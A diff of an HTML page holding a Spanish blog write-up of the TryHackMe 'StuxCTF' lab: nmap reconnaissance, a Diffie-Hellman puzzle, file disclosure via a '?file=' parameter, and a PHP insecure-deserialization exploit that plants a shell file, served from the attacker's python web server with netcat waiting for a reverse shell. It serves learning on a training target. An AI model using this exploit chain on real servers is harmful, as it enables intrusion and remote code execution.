@@ -1,14 +1,130 @@
-<!doctype html><html lang=es><head><title>StuxCTF - Write Up - Español ::
-Lanfran02 - Blog — Hackeando tu forma de aprender.</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Link Nivel Creador     Aquí Medio stuxnet    Reconocimiento Empezemos con nuestro mejor amigo nmap
-└──╼ $map stuxctf.thm [sudo] password for lanfran: Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-16 17:18 CEST Nmap scan report for stuxctf.thm Host is up (0.064s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 e8:da:b7:0d:a7:a1:cc:8e:ac:4b:19:6d:25:2b:3e:77 (RSA) | 256 c1:0c:5a:db:6c:d6:a3:15:96:85:21:e9:48:65:28:42 (ECDSA) |_ 256 0f:1a:6a:d1:bb:cb:a6:3e:bd:8f:99:8d:da:2f:30:86 (ED25519) 80/tcp open http Apache httpd 2."><meta name=keywords content="CTF,Writeup,Hacking"><meta name=robots content="noodp"><link rel=canonical href=/es/posts/stuxctf/><link rel=stylesheet href=/assets/style.css><link rel=stylesheet href=/style.css><link rel=apple-touch-icon-precomposed sizes=144x144 href=/img/apple-touch-icon-144-precomposed.png><link rel="shortcut icon" href=/img/favicon.png><link href=/assets/fonts/Inter-Italic.woff2 rel=preload type=font/woff2 as=font crossorigin><link href=/assets/fonts/Inter-Regular.woff2 rel=preload type=font/woff2 as=font crossorigin><link href=/assets/fonts/Inter-Medium.woff2 rel=preload type=font/woff2 as=font crossorigin><link href=/assets/fonts/Inter-MediumItalic.woff2 rel=preload type=font/woff2 as=font crossorigin><link href=/assets/fonts/Inter-Bold.woff2 rel=preload type=font/woff2 as=font crossorigin><link href=/assets/fonts/Inter-BoldItalic.woff2 rel=preload type=font/woff2 as=font crossorigin><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="/es/posts/stuxctf/cover.png"><meta name=twitter:title content="StuxCTF - Write Up - Español"><meta name=twitter:description content="Máquina de nivel medio en TryHackMe."><meta property="og:title" content="StuxCTF - Write Up - Español"><meta property="og:description" content="Máquina de nivel medio en TryHackMe."><meta property="og:type" content="article"><meta property="og:url" content="/es/posts/stuxctf/"><meta property="og:image" content="/es/posts/stuxctf/cover.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-07-06T12:52:17+02:00"><meta property="article:modified_time" content="2021-07-06T12:52:17+02:00"><meta property="og:site_name" content="Lanfran02 - Blog"><script async src="https://www.googletagmanager.com/gtag/js?id=G-3T7DYCWC0W"></script><script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-3T7DYCWC0W',{anonymize_ip:!1})}</script><script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga('create','G-3T7DYCWC0W','auto'),ga('send','pageview'))</script><script async src=https://www.google-analytics.com/analytics.js></script></head><body class=dark-theme><div class=container><header class=header><span class=header__inner><a href=/es/ class=logo style=text-decoration:none><span class=logo__mark><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg></span><span class=logo__text>Lanfran02</span>
-<span class=logo__cursor></span></a><span class=header__right><nav class=menu><ul class="menu__inner menu__inner--desktop"><li><a href=/es/about>Acerca de mí</a></li><li><a href=/>English</a></li><ul class=menu__sub-inner><li class=menu__sub-inner-more-trigger>Write Ups
-<span class=menu__sub-inner-more-trigger-icon><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg></span></li><ul class="menu__sub-inner-more hidden"><li><a href=/es/tags/hackthebox/>HTB</a></li><li><a href=/es/tags/tryhackme/>THM</a></li></ul></ul></ul><ul class="menu__inner menu__inner--mobile"><li><a href=/es/about>Acerca de mí</a></li><li><a href=/>English</a></li><li><a href=/es/tags/hackthebox/>HTB</a></li><li><a href=/es/tags/tryhackme/>THM</a></li></ul></nav><span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg></span><span class=theme-toggle><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg></span></span></span></header><div class=content><div class=post><h1 class=post-title>StuxCTF - Write Up - Español</h1><div class=post-meta><span class=post-date>2021-07-06</span>
+<!doctype html><html lang=es>
+<head>
+<title>
+StuxCTF - Write Up - Español ::
+Lanfran02 - Blog — Hackeando tu forma de aprender.
+</title>
+<meta charset=utf-8>
+<meta name=viewport content="width=device-width,initial-scale=1">
+<meta name=description content="Link Nivel Creador     Aquí Medio stuxnet    Reconocimiento Empezemos con nuestro mejor amigo nmap
+└──╼ $map stuxctf.thm [sudo] password for lanfran: Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-16 17:18 CEST Nmap scan report for stuxctf.thm Host is up (0.064s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 e8:da:b7:0d:a7:a1:cc:8e:ac:4b:19:6d:25:2b:3e:77 (RSA) | 256 c1:0c:5a:db:6c:d6:a3:15:96:85:21:e9:48:65:28:42 (ECDSA) |_ 256 0f:1a:6a:d1:bb:cb:a6:3e:bd:8f:99:8d:da:2f:30:86 (ED25519) 80/tcp open http Apache httpd 2.">
+<meta name=keywords content="CTF,Writeup,Hacking">
+<meta name=robots content="noodp">
+<link rel=canonical href=/es/posts/stuxctf/>
+<link rel=stylesheet href=/assets/style.css>
+<link rel=stylesheet href=/style.css>
+<link rel=apple-touch-icon-precomposed sizes=144x144 href=/img/apple-touch-icon-144-precomposed.png>
+<link rel="shortcut icon" href=/img/favicon.png>
+<link href=/assets/fonts/Inter-Italic.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<link href=/assets/fonts/Inter-Regular.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<link href=/assets/fonts/Inter-Medium.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<link href=/assets/fonts/Inter-MediumItalic.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<link href=/assets/fonts/Inter-Bold.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<link href=/assets/fonts/Inter-BoldItalic.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<meta name=twitter:card content="summary_large_image">
+<meta name=twitter:image content="/es/posts/stuxctf/cover.png">
+<meta name=twitter:title content="StuxCTF - Write Up - Español">
+<meta name=twitter:description content="Máquina de nivel medio en TryHackMe.">
+<meta property="og:title" content="StuxCTF - Write Up - Español">
+<meta property="og:description" content="Máquina de nivel medio en TryHackMe.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="/es/posts/stuxctf/"><meta property="og:image" content="/es/posts/stuxctf/cover.png"><meta property="article:section" content="posts">
+<meta property="article:published_time" content="2021-07-06T12:52:17+02:00">
+<meta property="article:modified_time" content="2021-07-06T12:52:17+02:00"><meta property="og:site_name" content="Lanfran02 - Blog">
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-3T7DYCWC0W"></script>
+<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-3T7DYCWC0W',{anonymize_ip:!1})}</script>
+<script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga('create','G-3T7DYCWC0W','auto'),ga('send','pageview'))</script>
+<script async src=https://www.google-analytics.com/analytics.js></script>
+</head>
+<body class=dark-theme>
+<div class=container>
+<header class=header>
+<span class=header__inner>
+<a href=/es/ class=logo style=text-decoration:none>
+<span class=logo__mark><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg>
+</span>
+<span class=logo__text>Lanfran02</span>
+<span class=logo__cursor></span>
+</a>
+<span class=header__right>
+<nav class=menu>
+<ul class="menu__inner menu__inner--desktop">
+<li><a href=/es/about>Acerca de mí</a></li>
+<li><a href=/>English</a></li>
+<ul class=menu__sub-inner>
+<li class=menu__sub-inner-more-trigger>
+Write Ups
+<span class=menu__sub-inner-more-trigger-icon><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg>
+</span>
+</li>
+<ul class="menu__sub-inner-more hidden">
+<li><a href=/es/tags/hackthebox/>HTB</a></li>
+<li><a href=/es/tags/tryhackme/>THM</a></li>
+</ul>
+</ul>
+</ul>
+<ul class="menu__inner menu__inner--mobile">
+<li><a href=/es/about>Acerca de mí</a></li>
+<li><a href=/>English</a></li>
+<li><a href=/es/tags/hackthebox/>HTB</a></li>
+<li><a href=/es/tags/tryhackme/>THM</a></li>
+</ul>
+</nav>
+<span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
+</span>
+<span class=theme-toggle><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg>
+</span>
+</span>
+</span>
+</header>
+<div class=content>
+<div class=post>
+<h1 class=post-title>StuxCTF - Write Up - Español</h1>
+<div class=post-meta>
+<span class=post-date>
+2021-07-06
+</span>
 <span class=post-author>— Escrito por Lanfran02</span>
-<span class=post-read-time>— 6 mins lectura</span></div><span class=post-tags><a href=/tags/nc/>#nc</a>&nbsp;
+<span class=post-read-time>— 6 mins lectura</span>
+</div>
+<span class=post-tags>
+<a href=/tags/nc/>#nc</a>&nbsp;
 <a href=/tags/unserialize/>#unserialize</a>&nbsp;
 <a href=/tags/crypto/>#crypto</a>&nbsp;
 <a href=/tags/sudo/>#sudo</a>&nbsp;
-<a href=/tags/tryhackme/>#TryHackMe</a>&nbsp;</span><figure class=post-cover><img src=/es/posts/stuxctf/cover.png alt="StuxCTF - Write Up - Español"></figure><div class=post-content><h2>Table of Contents</h2><aside class=table-of-contents><nav id=TableOfContents><ul><li><a href=#reconocimiento>Reconocimiento</a></li><li><a href=#acceso-inicial---usuario>Acceso inicial - Usuario</a></li><li><a href=#root>Root</a></li></ul></nav></aside><table><thead><tr><th>Link</th><th>Nivel</th><th>Creador</th></tr></thead><tbody><tr><td><a href=https://tryhackme.com/room/stuxctf>Aquí</a></td><td>Medio</td><td><a href=https://tryhackme.com/p/stuxnet>stuxnet</a></td></tr></tbody></table><h2 id=reconocimiento>Reconocimiento</h2><p>Empezemos con nuestro mejor amigo <code>nmap</code></p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>└──╼ $map stuxctf.thm
+<a href=/tags/tryhackme/>#TryHackMe</a>&nbsp;
+</span>
+<figure class=post-cover>
+<img src=/es/posts/stuxctf/cover.png alt="StuxCTF - Write Up - Español">
+</figure>
+<div class=post-content>
+<h2>Table of Contents</h2>
+<aside class=table-of-contents><nav id=TableOfContents>
+<ul>
+<li><a href=#reconocimiento>Reconocimiento</a></li>
+<li><a href=#acceso-inicial---usuario>Acceso inicial - Usuario</a></li>
+<li><a href=#root>Root</a></li>
+</ul>
+</nav></aside>
+<table>
+<thead>
+<tr>
+<th>Link</th>
+<th>Nivel</th>
+<th>Creador</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href=https://tryhackme.com/room/stuxctf>Aquí</a></td>
+<td>Medio</td>
+<td><a href=https://tryhackme.com/p/stuxnet>stuxnet</a></td>
+</tr>
+</tbody>
+</table>
+<h2 id=reconocimiento>Reconocimiento</h2>
+<p>Empezemos con nuestro mejor amigo <code>nmap</code></p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>└──╼ $map stuxctf.thm
 <span style=color:#f92672>[</span>sudo<span style=color:#f92672>]</span> password <span style=color:#66d9ef>for</span> lanfran: 
 Starting Nmap 7.91 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2021-06-16 17:18 CEST
 Nmap scan report <span style=color:#66d9ef>for</span> stuxctf.thm
@@ -26,8 +142,10 @@ PORT   STATE SERVICE VERSION
 |_http-server-header: Apache/2.4.18 <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span>
 |_http-title: Default Page
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-</code></pre></div><p>(Agregué la IP de la máquina a mi archivo /etc/hosts, también puedes hacerlo con este código)</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>sudo echo <span style=color:#e6db74>&#34;IP_MACHINA_THM stuxctf.thm&#34;</span> &gt;&gt; /etc/hosts
-</code></pre></div><p>Entonces, tenemos un servidor web ejecutándose en el puerto 80. Usemos <code>curl</code> para verificarlo.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ curl stuxctf.thm
+</code></pre></div><p>(Agregué la IP de la máquina a mi archivo /etc/hosts, también puedes hacerlo con este código)</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>sudo echo <span style=color:#e6db74>&#34;IP_MACHINA_THM stuxctf.thm&#34;</span> &gt;&gt; /etc/hosts
+</code></pre></div><p>Entonces, tenemos un servidor web ejecutándose en el puerto 80. Usemos <code>curl</code> para verificarlo.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ curl stuxctf.thm
 &lt;html&gt;
 	&lt;head&gt;
 		&lt;title&gt;Default Page&lt;/title&gt;
@@ -44,13 +162,16 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 	&lt;/body&gt;
 &lt;/html&gt;
 
-</code></pre></div><p>Mmmm interesante. Veamos qué tiene el <code>robots.txt</code>.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ curl stuxctf.thm/robots.txt
+</code></pre></div><p>Mmmm interesante. Veamos qué tiene el <code>robots.txt</code>.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ curl stuxctf.thm/robots.txt
 <span style=color:#75715e># robots.txt generated by StuxCTF</span>
 <span style=color:#75715e># Diffie-Hellman</span>
 User-agent: *
 Disallow: 
 Disallow: /StuxCTF/
-</code></pre></div><p>De acuerdo, tenemos un directorio (spoiler: no existe &mldr;) y una pista &ldquo;Diffie-Hellman&rdquo; &mldr;</p><p>Leamos la pista en la página de CTF:</p><pre><code>Original:
+</code></pre></div><p>De acuerdo, tenemos un directorio (spoiler: no existe &mldr;) y una pista &ldquo;Diffie-Hellman&rdquo; &mldr;</p>
+<p>Leamos la pista en la página de CTF:</p>
+<pre><code>Original:
 What is the hidden directory?
 
 HINT: g ^ a mod p, g ^ b mod p, g ^ C mod p
@@ -62,7 +183,12 @@ Español
 Pista: g ^ a mod p, g ^ b mod p, g ^ C mod p
 
 Los primero 128 caracteres.
-</code></pre><p>Entonces, buscando en Google &ldquo;g^a mod p, g^b mod p, g^c mod p&rdquo;,encontramos 2 cosas:</p><ul><li>El creador de esta sala está utilizando un cifrado Diffie-Hellman.</li><li><a href=https://razzk.net/posts/Crypto-300_1/>Un writeup de un laboratorio &ldquo;QIWI - Crypto 300_1&rdquo;, con un código en Python para descifrar el mensaje.</a></li></ul><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#!/usr/bin/env sage -python</span>
+</code></pre><p>Entonces, buscando en Google &ldquo;g^a mod p, g^b mod p, g^c mod p&rdquo;,encontramos 2 cosas:</p>
+<ul>
+<li>El creador de esta sala está utilizando un cifrado Diffie-Hellman.</li>
+<li><a href=https://razzk.net/posts/Crypto-300_1/>Un writeup de un laboratorio &ldquo;QIWI - Crypto 300_1&rdquo;, con un código en Python para descifrar el mensaje.</a></li>
+</ul>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#!/usr/bin/env sage -python</span>
 
 p<span style=color:#f92672>=</span>XXXXXXX
 g<span style=color:#f92672>=</span>X
@@ -74,7 +200,10 @@ gca <span style=color:#f92672>=</span> (gc<span style=color:#f92672>**</span>a) 
 gcab <span style=color:#f92672>=</span> (gca<span style=color:#f92672>**</span>b) <span style=color:#f92672>%</span> p
 
 print <span style=color:#e6db74>&#34;flag: &#34;</span>, str(gcab)[:<span style=color:#ae81ff>20</span>]
-</code></pre></div><p>Editemoslo para que funcione con nuestros números.</p><p><img src=Directory.png alt=Directory></p><p>¡Bien! Ahora tenemos el directorio oculto, así que naveguemos hasta él.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ curl stuxctf.thm/4731502893726489553913132817<span style=color:#f92672>[</span>REDACTADO<span style=color:#f92672>]</span>77039984023005189203993885687328953804202704977050807800832928198526567069446044422855055/
+</code></pre></div><p>Editemoslo para que funcione con nuestros números.</p>
+<p><img src=Directory.png alt=Directory></p>
+<p>¡Bien! Ahora tenemos el directorio oculto, así que naveguemos hasta él.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ curl stuxctf.thm/4731502893726489553913132817<span style=color:#f92672>[</span>REDACTADO<span style=color:#f92672>]</span>77039984023005189203993885687328953804202704977050807800832928198526567069446044422855055/
 &lt;!DOCTYPE html&gt;
     &lt;head&gt;
         &lt;title&gt;StuxCTF&lt;/title&gt;
@@ -108,7 +237,10 @@ print <span style=color:#e6db74>&#34;flag: &#34;</span>, str(gcab)[:<span style=
 &lt;/html&gt;
 </code></pre></div><p>Hmmm, we have a index saying &ldquo;<em>Follow the white rabbit..</em>&rdquo;
 Hmmm, tenemos una index que dice &ldquo;<em>Follow the white rabbit..</em>"("<em>Sigue al conejo blanco&mldr;</em>")
-Y tambien una pista oculta: <code>&lt;!-- hint: /?file= --></code></p><p>Entonces, ¿quizás la página PHP está esperando el parámetro GET &ldquo;file&rdquo;?</p><p>Fue complicado, porque lo intenté con <code>etc/paswd</code> | apache logs | y todos los directorios comunes, pero nada funcionó, así que lo intenté con <code>index.php</code> y funcionó.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>curl http://10.10.250.63/47315028937264895539131328176684350732<span style=color:#f92672>[</span>REDACTADO<span style=color:#f92672>]</span>202704977050807800832928198526567069446044422855055/<span style=color:#ae81ff>\?</span>file<span style=color:#ae81ff>\=</span>index.php
+Y tambien una pista oculta: <code>&lt;!-- hint: /?file= --></code></p>
+<p>Entonces, ¿quizás la página PHP está esperando el parámetro GET &ldquo;file&rdquo;?</p>
+<p>Fue complicado, porque lo intenté con <code>etc/paswd</code> | apache logs | y todos los directorios comunes, pero nada funcionó, así que lo intenté con <code>index.php</code> y funcionó.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>curl http://10.10.250.63/47315028937264895539131328176684350732<span style=color:#f92672>[</span>REDACTADO<span style=color:#f92672>]</span>202704977050807800832928198526567069446044422855055/<span style=color:#ae81ff>\?</span>file<span style=color:#ae81ff>\=</span>index.php
 3d3d67432b384349794a47502b7757623068324c386f67507641696369786a50355232626939435067414349676f67507641696369786a5030425861794e326376776a50694d6e617534576174354363684a48647a523362764a324c7a70324c7a52585a7a4e585969307a59794e484930425861794e32633841434967414349674143494b347a4c67496e5938344464776c6d636a4e334c38346a497a706d4c756c5762754d6a4c78456a4c78305365795657647870324c7a70324c7a52585a7a4e585969307a59794e484930425861794e32633841434967414349674143494b347a4c67496e593841434967414349674143496741434967346a647052324c3841434967414349674143494b347a4c67496e5938346a647052324c38414349674143496741434967414349676f67507641696369786a507956476475563259767754434a6b51434b347a4c67496e593834544d6f39435075344364704a6d59684a48496c5258616f6448496c68476467633362737832624735544d6f7854434a6b51434a6f67507641696369786a5079564764<span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>79396d6379566d432b384349794a4750&lt;!DOCTYPE html&gt;
     &lt;head&gt;
         &lt;title&gt;StuxCTF&lt;/title&gt;
@@ -140,7 +272,10 @@ Y tambien una pista oculta: <code>&lt;!-- hint: /?file= --></code></p><p>Entonce
         &lt;script src<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;assets/js/bootstrap.min.js&#34;</span>&gt;&lt;/script&gt;
     &lt;/body&gt;
 &lt;/html&gt;
-</code></pre></div><p>¡Devolvió un texto codificado muy largo!</p><p>Utilizé <a href=https://tinyurl.com/5fu8tzc9>esta receta de cyberchef</a> para decodificarlo.</p><p>¡Y obtenemos el código php del archivo index.php!</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>br</span> <span style=color:#f92672>/&gt;</span>
+</code></pre></div><p>¡Devolvió un texto codificado muy largo!</p>
+<p>Utilizé <a href=https://tinyurl.com/5fu8tzc9>esta receta de cyberchef</a> para decodificarlo.</p>
+<p>¡Y obtenemos el código php del archivo index.php!</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>br</span> <span style=color:#f92672>/&gt;</span>
 <span style=color:#a6e22e>error_reporting</span>(<span style=color:#ae81ff>0</span>);<span style=color:#f92672>&lt;</span><span style=color:#a6e22e>br</span> <span style=color:#f92672>/&gt;</span>
 <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>file</span> {<span style=color:#f92672>&lt;</span><span style=color:#a6e22e>br</span> <span style=color:#f92672>/&gt;</span>
         <span style=color:#66d9ef>public</span> $file <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;dump.txt&#34;</span>;<span style=color:#f92672>&lt;</span><span style=color:#a6e22e>br</span> <span style=color:#f92672>/&gt;</span>
@@ -195,7 +330,15 @@ $file_name <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#
     <span style=color:#f92672>&lt;/</span><span style=color:#a6e22e>body</span><span style=color:#f92672>&gt;&lt;</span><span style=color:#a6e22e>br</span> <span style=color:#f92672>/&gt;</span>
 <span style=color:#f92672>&lt;/</span><span style=color:#a6e22e>html</span><span style=color:#f92672>&gt;&lt;</span><span style=color:#a6e22e>br</span> <span style=color:#f92672>/&gt;</span>
 
-</code></pre></div><h2 id=acceso-inicial---usuario>Acceso inicial - Usuario</h2><p>Analizando el código, podemos obtener información valiosa:</p><ul><li>Una parte del código está creando una <code>clase</code></li><li>La descripción de la sala dice: <em>&ldquo;Crypto, <strong>serealization</strong>, priv scalation and more &mldr;"</em> Dándonos una pista, tal vez podamos obtener la ejecución remota de código a través de la deserialización insegura en PHP.</li></ul><p>Para ello, busqué información en Google y encontré una página que explica cómo hacerlo. <a href=https://www.sjoerdlangkemper.nl/2021/04/04/remote-code-execution-through-unsafe-unserialize/>Aquí está el enlace</a>.</p><p>Entonces, con este fragmento de código, ¡podemos obtener RCE!</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+</code></pre></div><h2 id=acceso-inicial---usuario>Acceso inicial - Usuario</h2>
+<p>Analizando el código, podemos obtener información valiosa:</p>
+<ul>
+<li>Una parte del código está creando una <code>clase</code></li>
+<li>La descripción de la sala dice: <em>&ldquo;Crypto, <strong>serealization</strong>, priv scalation and more &mldr;"</em> Dándonos una pista, tal vez podamos obtener la ejecución remota de código a través de la deserialización insegura en PHP.</li>
+</ul>
+<p>Para ello, busqué información en Google y encontré una página que explica cómo hacerlo. <a href=https://www.sjoerdlangkemper.nl/2021/04/04/remote-code-execution-through-unsafe-unserialize/>Aquí está el enlace</a>.</p>
+<p>Entonces, con este fragmento de código, ¡podemos obtener RCE!</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
 <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>file</span> 
 {
 	<span style=color:#66d9ef>public</span> $file <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;this_is_totally_not_a_shell.php&#39;</span>;
@@ -205,38 +348,103 @@ $file_name <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#
 $exploit <span style=color:#f92672>=</span> <span style=color:#a6e22e>serialize</span>(<span style=color:#66d9ef>new</span> <span style=color:#a6e22e>file</span>);
 <span style=color:#66d9ef>echo</span> $exploit;
 <span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
-</span></code></pre></div><p>Entonces esto es lo que vamos a hacer:</p><ul><li>Ejecutar el archivo php y guardar el código en un archivo <code>.txt</code>.</li><li>Ir a la carpeta donde se encuentra el archivo <code>.txt</code> en nuestra máquina local y cree un servidor web simple con python <code>sudo python3 -m http.server 80</code>.</li><li>Ir a la página, y en el parámetro <code>file</code> vamos a poner nuestra IP del <code>tun0</code> y el nombre del archivo .txt.</li><li>Ejecutar <code>netcat</code> para capturar la shell reversa.</li><li>Finalmente vaya al archivo <code>this_is_totally_not_a_shell.php</code>.</li></ul><ol><li></li></ol><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ php exp.php &gt; not_a_shell.txt 
-</code></pre></div><ol start=2><li></li></ol><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ sudo python3 -m http.server <span style=color:#ae81ff>80</span>                                                                                 ─╯
+</span></code></pre></div><p>Entonces esto es lo que vamos a hacer:</p>
+<ul>
+<li>Ejecutar el archivo php y guardar el código en un archivo <code>.txt</code>.</li>
+<li>Ir a la carpeta donde se encuentra el archivo <code>.txt</code> en nuestra máquina local y cree un servidor web simple con python <code>sudo python3 -m http.server 80</code>.</li>
+<li>Ir a la página, y en el parámetro <code>file</code> vamos a poner nuestra IP del <code>tun0</code> y el nombre del archivo .txt.</li>
+<li>Ejecutar <code>netcat</code> para capturar la shell reversa.</li>
+<li>Finalmente vaya al archivo <code>this_is_totally_not_a_shell.php</code>.</li>
+</ul>
+<ol>
+<li></li>
+</ol>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ php exp.php &gt; not_a_shell.txt 
+</code></pre></div><ol start=2>
+<li></li>
+</ol>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ sudo python3 -m http.server <span style=color:#ae81ff>80</span>                                                                                 ─╯
 <span style=color:#f92672>[</span>sudo<span style=color:#f92672>]</span> password <span style=color:#66d9ef>for</span> lanfran: 
 Serving HTTP on 0.0.0.0 port <span style=color:#ae81ff>80</span> <span style=color:#f92672>(</span>http://0.0.0.0:80/<span style=color:#f92672>)</span> ...
